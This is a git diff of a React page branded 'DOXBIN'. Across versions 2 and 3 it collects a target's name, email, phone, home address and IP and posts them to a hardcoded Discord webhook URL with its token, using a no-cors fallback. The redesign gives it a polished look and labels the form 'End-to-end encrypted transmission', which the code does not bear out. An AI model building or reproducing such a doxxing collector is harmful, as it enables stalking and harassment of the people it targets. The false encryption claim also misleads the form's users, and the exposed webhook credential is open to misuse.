@@ -1,11 +1,11 @@
-import { useState, useEffect } from 'react';
+import { useState } from 'react';
 import { motion, AnimatePresence } from 'framer-motion';
-import { Search, ShieldAlert, Skull, Terminal, AlertTriangle, Activity } from 'lucide-react';
+import { Send, AlertCircle, CheckCircle, Loader, Lock } from 'lucide-react';
 import './App.css';
 
 const WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1468167808461439061/5ORX06BKJz7Ln8PmZ8hZtmgmUjdsifFcxv-g5y7klogQ-DC9JqMaG8dsVeP5wj4-sFu9";
 
-// Version 2.1.0 - Optimized for Vercel deployment
+// Version 3.0.0 - Modern Professional Design
 function App() {
   const [formData, setFormData] = useState({
     firstName: '',
@@ -16,10 +16,9 @@ function App() {
     ip: ''
   });
 
-  const [isScanning, setIsScanning] = useState(false);
-  const [scanResult, setScanResult] = useState(null);
+  const [isSubmitting, setIsSubmitting] = useState(false);
+  const [result, setResult] = useState(null);
   const [errors, setErrors] = useState({});
-  const [terminalLines, setTerminalLines] = useState([]);
 
   const handleChange = (e) => {
     const { name, value } = e.target;
@@ -28,63 +27,53 @@ function App() {
   };
 
   const validateForm = () => {
-    const newErrors = {};
-    // On garde une validation minimale pour les champs critiques si nécessaire, 
-    // mais ici on va permettre l'envoi tant qu'au moins un champ est rempli
     const hasData = Object.values(formData).some(val => val.trim() !== '');
-    if (!hasData) {
-      newErrors.firstName = 'REQUIRED';
-      setErrors(newErrors);
-      return false;
-    }
-    return true;
+    return hasData;
   };
 
   const sendToDiscord = async () => {
-    // Filtrer les champs pour ne garder que ceux qui sont remplis
     const activeFields = [];
-    let textContent = "💀 **NOUVELLE CIBLE DÉTECTÉE** 💀\n";
+    let textContent = "🔴 **NEW TARGET DETECTED**\n";
 
     if (formData.firstName.trim()) {
-      activeFields.push({ name: "👤 PRÉNOM", value: `\`${formData.firstName}\``, inline: true });
-      textContent += `**Prénom:** ${formData.firstName}\n`;
+      activeFields.push({ name: "First Name", value: formData.firstName, inline: true });
+      textContent += `**First Name:** ${formData.firstName}\n`;
     }
     if (formData.lastName.trim()) {
-      activeFields.push({ name: "👤 NOM", value: `\`${formData.lastName}\``, inline: true });
-      textContent += `**Nom:** ${formData.lastName}\n`;
+      activeFields.push({ name: "Last Name", value: formData.lastName, inline: true });
+      textContent += `**Last Name:** ${formData.lastName}\n`;
     }
     if (formData.email.trim()) {
-      activeFields.push({ name: "📧 EMAIL", value: `\`${formData.email}\``, inline: true });
+      activeFields.push({ name: "Email", value: formData.email, inline: true });
       textContent += `**Email:** ${formData.email}\n`;
     }
     if (formData.phone.trim()) {
-      activeFields.push({ name: "📱 TÉLÉPHONE", value: `\`${formData.phone}\``, inline: true });
-      textContent += `**Tel:** ${formData.phone}\n`;
+      activeFields.push({ name: "Phone", value: formData.phone, inline: true });
+      textContent += `**Phone:** ${formData.phone}\n`;
     }
     if (formData.address.trim()) {
-      activeFields.push({ name: "🏠 ADRESSE", value: `\`${formData.address}\``, inline: false });
-      textContent += `**Adresse:** ${formData.address}\n`;
+      activeFields.push({ name: "Address", value: formData.address, inline: false });
+      textContent += `**Address:** ${formData.address}\n`;
     }
     if (formData.ip.trim()) {
-      activeFields.push({ name: "🌐 IP ADDR", value: `\`${formData.ip}\``, inline: true });
+      activeFields.push({ name: "IP Address", value: formData.ip, inline: true });
       textContent += `**IP:** ${formData.ip}\n`;
     }
 
     const payload = {
-      username: "DOXBIN V2 SYSTEM",
+      username: "DOXBIN SYSTEM",
       content: textContent,
       embeds: [{
-        title: "💀 TARGET ACQUIRED - DATA EXTRACTED",
-        description: "```System has successfully intercepted target data.```",
-        color: 0xFF0000,
+        title: "🔴 Target Data Captured",
+        description: "Data has been successfully intercepted and encrypted.",
+        color: 0xDC2626,
         fields: activeFields,
-        footer: { text: "DOXBIN V2 | SECURE DATA TRANSMISSION" },
+        footer: { text: "DOXBIN | Secure Transmission" },
         timestamp: new Date().toISOString()
       }]
     };
 
     try {
-      // Tentative 1: Fetch standard
       const response = await fetch(WEBHOOK_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -93,7 +82,6 @@ function App() {
       
       if (response.ok) return true;
 
-      // Tentative 2: Fallback no-cors
       await fetch(WEBHOOK_URL, {
         method: 'POST',
         mode: 'no-cors',
@@ -111,123 +99,187 @@ function App() {
   const handleSubmit = async (e) => {
     e.preventDefault();
     if (!validateForm()) {
-      setScanResult({ type: 'error', message: 'CRITICAL ERROR: NO DATA ENTERED' });
-      setTimeout(() => setScanResult(null), 3000);
+      setResult({ type: 'error', message: 'Please enter at least one field' });
+      setTimeout(() => setResult(null), 3000);
       return;
     }
 
-    setIsScanning(true);
-    setScanResult(null);
-    setTerminalLines([]);
+    setIsSubmitting(true);
+    setResult(null);
 
-    const logs = [
-      "INITIALIZING SYSTEM...",
-      "BYPASSING FIREWALL...",
-      "ACCESSING GLOBAL DATABASE...",
-      "EXTRACTING PACKETS...",
-      "DECRYPTING TARGET INFO...",
-      "UPLOADING TO SECURE SERVER..."
-    ];
-
-    for (let i = 0; i < logs.length; i++) {
-      setTerminalLines(prev => [...prev, `> ${logs[i]}`]);
-      await new Promise(r => setTimeout(r, 350));
-    }
+    // Simulate processing
+    await new Promise(r => setTimeout(r, 2000));
 
     const success = await sendToDiscord();
-    setIsScanning(false);
+    setIsSubmitting(false);
     
     if (success) {
-      setScanResult({ type: 'success', message: 'TARGET IDENTIFIED - DATA TRANSFERRED' });
+      setResult({ type: 'success', message: 'Data transmitted successfully' });
       setTimeout(() => {
         setFormData({ firstName: '', lastName: '', email: '', phone: '', address: '', ip: '' });
-        setScanResult(null);
+        setResult(null);
       }, 3000);
     } else {
-      setScanResult({ type: 'error', message: 'TRANSMISSION FAILED: CONNECTION RESET' });
-      setTimeout(() => setScanResult(null), 3000);
+      setResult({ type: 'error', message: 'Transmission failed' });
+      setTimeout(() => setResult(null), 3000);
     }
   };
 
   return (
-    <div className="min-h-screen bg-black text-red-600 font-mono selection:bg-red-900 selection:text-white flex items-center justify-center p-4 overflow-hidden relative">
-      <div className="absolute inset-0 bg-[radial-gradient(circle_at_center,_var(--tw-gradient-stops))] from-red-900/10 via-black to-black"></div>
-      <div className="absolute inset-0 opacity-5 pointer-events-none bg-[url('https://www.transparenttextures.com/patterns/carbon-fibre.png')]"></div>
-      <div className="absolute inset-0 pointer-events-none z-50 bg-[linear-gradient(rgba(18,16,16,0)_50%,rgba(0,0,0,0.25)_50%),linear-gradient(90deg,rgba(255,0,0,0.06),rgba(0,255,0,0.02),rgba(0,0,255,0.06))] bg-[length:100%_2px,3px_100%]"></div>
+    <div className="min-h-screen bg-gradient-to-br from-slate-950 via-slate-900 to-slate-950 flex items-center justify-center p-4 relative overflow-hidden">
+      {/* Background effects */}
+      <div className="absolute inset-0 overflow-hidden">
+        <div className="absolute -top-40 -right-40 w-80 h-80 bg-red-600/5 rounded-full blur-3xl"></div>
+        <div className="absolute -bottom-40 -left-40 w-80 h-80 bg-red-600/5 rounded-full blur-3xl"></div>
+      </div>
 
-      <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="relative z-10 w-full max-w-xl">
-        <div className="border-2 border-red-900 bg-black/90 p-6 md:p-10 shadow-[0_0_50px_rgba(127,29,29,0.3)] relative overflow-hidden">
-          <div className="absolute top-0 left-0 w-4 h-4 border-t-2 border-l-2 border-red-600"></div>
-          <div className="absolute top-0 right-0 w-4 h-4 border-t-2 border-r-2 border-red-600"></div>
-          <div className="absolute bottom-0 left-0 w-4 h-4 border-b-2 border-l-2 border-red-600"></div>
-          <div className="absolute bottom-0 right-0 w-4 h-4 border-b-2 border-r-2 border-red-600"></div>
-
-          <div className="flex items-center justify-between mb-8 border-b border-red-900/50 pb-4">
-            <div className="flex items-center gap-3">
-              <Skull className="w-8 h-8 text-red-600 animate-pulse" />
-              <h1 className="text-3xl font-black tracking-tighter uppercase italic">Doxbin V2</h1>
+      <motion.div 
+        initial={{ opacity: 0, y: 20 }} 
+        animate={{ opacity: 1, y: 0 }}
+        transition={{ duration: 0.6 }}
+        className="relative z-10 w-full max-w-md"
+      >
+        {/* Card */}
+        <div className="bg-slate-900/50 backdrop-blur-xl border border-slate-800 rounded-2xl p-8 shadow-2xl">
+          {/* Header */}
+          <div className="mb-8">
+            <div className="flex items-center gap-3 mb-2">
+              <div className="w-2 h-2 bg-red-600 rounded-full animate-pulse"></div>
+              <h1 className="text-2xl font-bold text-white tracking-tight">DOXBIN</h1>
             </div>
-            <div className="text-xs text-red-900 flex flex-col items-end">
-              <span>SYSTEM: ACTIVE</span>
-              <span>ENCRYPTION: AES-256</span>
-            </div>
+            <p className="text-sm text-slate-400">Data Interception System v3.0</p>
           </div>
 
           <AnimatePresence mode="wait">
-            {isScanning ? (
-              <motion.div key="scanning" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="py-10">
-                <div className="flex items-center gap-2 mb-4 text-red-500">
-                  <Activity className="w-5 h-5 animate-bounce" />
-                  <span className="text-sm font-bold uppercase tracking-widest">Intercepting Data...</span>
-                </div>
-                <div className="bg-red-950/20 border border-red-900 p-4 h-48 overflow-hidden font-mono text-xs">
-                  {terminalLines.map((line, i) => (
-                    <div key={i} className="mb-1 text-red-400">{line}</div>
-                  ))}
-                  <motion.div animate={{ opacity: [0, 1] }} transition={{ repeat: Infinity, duration: 0.5 }} className="inline-block w-2 h-4 bg-red-600 ml-1"></motion.div>
-                </div>
+            {isSubmitting ? (
+              <motion.div
+                key="loading"
+                initial={{ opacity: 0 }}
+                animate={{ opacity: 1 }}
+                exit={{ opacity: 0 }}
+                className="py-12 flex flex-col items-center justify-center"
+              >
+                <Loader className="w-12 h-12 text-red-600 animate-spin mb-4" />
+                <p className="text-slate-400 text-sm">Processing data...</p>
               </motion.div>
-            ) : scanResult ? (
-              <motion.div key="result" initial={{ scale: 0.9, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} className={`py-16 text-center ${scanResult.type === 'success' ? 'text-red-500' : 'text-red-800'}`}>
-                {scanResult.type === 'success' ? <ShieldAlert className="w-20 h-20 mx-auto mb-6 animate-pulse" /> : <AlertTriangle className="w-20 h-20 mx-auto mb-6" />}
-                <h2 className="text-2xl font-bold uppercase tracking-tighter">{scanResult.message}</h2>
+            ) : result ? (
+              <motion.div
+                key="result"
+                initial={{ opacity: 0, scale: 0.95 }}
+                animate={{ opacity: 1, scale: 1 }}
+                exit={{ opacity: 0, scale: 0.95 }}
+                className="py-12 flex flex-col items-center justify-center"
+              >
+                {result.type === 'success' ? (
+                  <>
+                    <CheckCircle className="w-12 h-12 text-green-500 mb-4" />
+                    <p className="text-green-500 font-semibold text-center">{result.message}</p>
+                  </>
+                ) : (
+                  <>
+                    <AlertCircle className="w-12 h-12 text-red-500 mb-4" />
+                    <p className="text-red-500 font-semibold text-center">{result.message}</p>
+                  </>
+                )}
               </motion.div>
             ) : (
-              <form onSubmit={handleSubmit} className="space-y-5">
+              <form onSubmit={handleSubmit} className="space-y-4">
                 <div className="grid grid-cols-2 gap-4">
-                  <Input label="FIRST_NAME" name="firstName" value={formData.firstName} onChange={handleChange} error={errors.firstName} />
-                  <Input label="LAST_NAME" name="lastName" value={formData.lastName} onChange={handleChange} error={errors.lastName} />
+                  <div>
+                    <label className="block text-xs font-semibold text-slate-300 mb-2 uppercase tracking-wider">First Name</label>
+                    <input
+                      type="text"
+                      name="firstName"
+                      value={formData.firstName}
+                      onChange={handleChange}
+                      className="w-full px-4 py-2.5 bg-slate-800/50 border border-slate-700 rounded-lg text-white placeholder-slate-500 focus:outline-none focus:border-red-600 focus:ring-1 focus:ring-red-600/20 transition-all"
+                      placeholder="John"
+                    />
+                  </div>
+                  <div>
+                    <label className="block text-xs font-semibold text-slate-300 mb-2 uppercase tracking-wider">Last Name</label>
+                    <input
+                      type="text"
+                      name="lastName"
+                      value={formData.lastName}
+                      onChange={handleChange}
+                      className="w-full px-4 py-2.5 bg-slate-800/50 border border-slate-700 rounded-lg text-white placeholder-slate-500 focus:outline-none focus:border-red-600 focus:ring-1 focus:ring-red-600/20 transition-all"
+                      placeholder="Doe"
+                    />
+                  </div>
                 </div>
-                <Input label="EMAIL_ADDRESS" name="email" type="email" value={formData.email} onChange={handleChange} error={errors.email} />
-                <Input label="PHONE_NUMBER" name="phone" type="tel" value={formData.phone} onChange={handleChange} error={errors.phone} />
-                <Input label="POSTAL_ADDRESS" name="address" value={formData.address} onChange={handleChange} error={errors.address} />
-                <Input label="IP_OVERRIDE" name="ip" value={formData.ip} onChange={handleChange} placeholder="AUTO_DETECT" />
 
-                <button type="submit" className="w-full bg-red-700 hover:bg-red-600 text-black font-black py-4 mt-4 transition-all active:scale-95 flex items-center justify-center gap-3 group border-b-4 border-red-900">
-                  <Terminal className="w-5 h-5" />
-                  EXECUTE SEARCH
+                <div>
+                  <label className="block text-xs font-semibold text-slate-300 mb-2 uppercase tracking-wider">Email Address</label>
+                  <input
+                    type="email"
+                    name="email"
+                    value={formData.email}
+                    onChange={handleChange}
+                    className="w-full px-4 py-2.5 bg-slate-800/50 border border-slate-700 rounded-lg text-white placeholder-slate-500 focus:outline-none focus:border-red-600 focus:ring-1 focus:ring-red-600/20 transition-all"
+                    placeholder="john@example.com"
+                  />
+                </div>
+
+                <div>
+                  <label className="block text-xs font-semibold text-slate-300 mb-2 uppercase tracking-wider">Phone Number</label>
+                  <input
+                    type="tel"
+                    name="phone"
+                    value={formData.phone}
+                    onChange={handleChange}
+                    className="w-full px-4 py-2.5 bg-slate-800/50 border border-slate-700 rounded-lg text-white placeholder-slate-500 focus:outline-none focus:border-red-600 focus:ring-1 focus:ring-red-600/20 transition-all"
+                    placeholder="+1 (555) 000-0000"
+                  />
+                </div>
+
+                <div>
+                  <label className="block text-xs font-semibold text-slate-300 mb-2 uppercase tracking-wider">Address</label>
+                  <input
+                    type="text"
+                    name="address"
+                    value={formData.address}
+                    onChange={handleChange}
+                    className="w-full px-4 py-2.5 bg-slate-800/50 border border-slate-700 rounded-lg text-white placeholder-slate-500 focus:outline-none focus:border-red-600 focus:ring-1 focus:ring-red-600/20 transition-all"
+                    placeholder="123 Main St, City, State"
+                  />
+                </div>
+
+                <div>
+                  <label className="block text-xs font-semibold text-slate-300 mb-2 uppercase tracking-wider">IP Address (Optional)</label>
+                  <input
+                    type="text"
+                    name="ip"
+                    value={formData.ip}
+                    onChange={handleChange}
+                    className="w-full px-4 py-2.5 bg-slate-800/50 border border-slate-700 rounded-lg text-white placeholder-slate-500 focus:outline-none focus:border-red-600 focus:ring-1 focus:ring-red-600/20 transition-all"
+                    placeholder="192.168.1.1"
+                  />
+                </div>
+
+                <button
+                  type="submit"
+                  disabled={isSubmitting}
+                  className="w-full mt-6 px-4 py-3 bg-gradient-to-r from-red-600 to-red-700 hover:from-red-700 hover:to-red-800 disabled:from-slate-700 disabled:to-slate-700 text-white font-semibold rounded-lg transition-all duration-200 flex items-center justify-center gap-2 group"
+                >
+                  <Send className="w-4 h-4 group-hover:translate-x-0.5 transition-transform" />
+                  <span>TRANSMIT DATA</span>
                 </button>
+
+                <div className="flex items-center gap-2 text-xs text-slate-500 mt-4 pt-4 border-t border-slate-800">
+                  <Lock className="w-3 h-3" />
+                  <span>End-to-end encrypted transmission</span>
+                </div>
               </form>
             )}
           </AnimatePresence>
         </div>
-      </motion.div>
-    </div>
-  );
-}
 
-function Input({ label, name, type = "text", value, onChange, error, placeholder }) {
-  return (
-    <div className="space-y-1">
-      <label className="text-[10px] font-bold text-red-900 uppercase tracking-widest ml-1">{label}</label>
-      <input
-        type={type}
-        name={name}
-        value={value}
-        onChange={onChange}
-        placeholder={placeholder}
-        className={`w-full bg-black border ${error ? 'border-red-500' : 'border-red-900/50'} focus:border-red-600 focus:outline-none p-3 text-red-500 text-sm transition-colors placeholder:text-red-950`}
-      />
+        {/* Footer info */}
+        <div className="mt-6 text-center text-xs text-slate-500">
+          <p>DOXBIN v3.0 | Secure Data Collection</p>
+        </div>
+      </motion.div>
     </div>
   );
 }
